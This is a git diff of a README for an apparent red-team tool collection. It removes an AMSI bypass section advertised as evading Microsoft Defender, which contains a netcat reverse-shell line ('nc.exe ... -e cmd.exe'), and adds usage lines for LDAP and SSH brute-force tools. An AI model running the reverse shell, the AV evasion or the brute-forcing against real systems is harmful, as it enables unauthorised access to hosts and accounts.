@@ -13,19 +13,13 @@ You can use the tools in pentest or redteam work. If the tool is detected by AV,
 ## List of my tools
 
 
-### AMSI
+### Ldap Bruteforce
 ---
-Golang amsi bypass, currently undetected by Microsoft Defender and possibly other AV solutions
-- Usage:
-  - Download [amsi.exe](https://github.com/namcuongq/security/blob/main/amsi/amsi.exe) and upload to victim
-  - Run amsi.exe and enjoy it.
-####
-  *Note: if you want to add add parameter to program or open any exe file with bypass amsi mode, You only need put them into file with name godpay in the same directory amsi.exe. Example godpay file:*
-  ```
-  powershell ipconfig
-  or 
-  C:\Users\Public\nc.exe 192.168.0.19 8080 -e cmd.exe
-  ```
+[ldap_brute](https://github.com/namcuongq/security/raw/main/ldap_brute/ldapbrute) Small tool to help brute force ldap
+```
+ldapbrute -u <user> -p <password> -h <host>
+ldapbrute -U <user file> -P <password file> -H <host file>
+```
   
 ### Bypass-CLM
 ---
@@ -79,6 +73,6 @@ Simple Remote Code Execution Tool via http or https which is normally not blocke
 [ssh_brute](https://github.com/namcuongq/security/tree/main/ssh_brute) Small tool to help brute force ssh
 ```
 ssh_brute -u <user> -p <password> -h <host>
-ssh_brute -U <user file> -P <password file> -hH <host file>
+ssh_brute -U <user file> -P <password file> -H <host file>
 ```
   
